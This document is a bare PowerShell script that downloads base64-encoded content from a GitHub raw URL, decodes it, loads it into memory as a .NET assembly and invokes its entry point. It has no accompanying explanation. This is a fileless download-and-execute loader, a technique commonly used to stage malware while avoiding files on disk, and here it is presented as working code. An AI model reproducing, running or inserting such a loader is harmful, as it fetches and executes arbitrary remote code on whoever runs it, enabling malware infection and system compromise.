$url = "https://raw.githubusercontent.com/mohamedali43/ps1/main/test.exe"

$response = Invoke-WebRequest -Uri $url

$byteArray = [System.Convert]::FromBase64String($response.Content)

$assembly = [System.Reflection.Assembly]::Load($byteArray)

$entryPoint = $assembly.EntryPoint
$entryPoint.Invoke($null, @([string[]]@()))
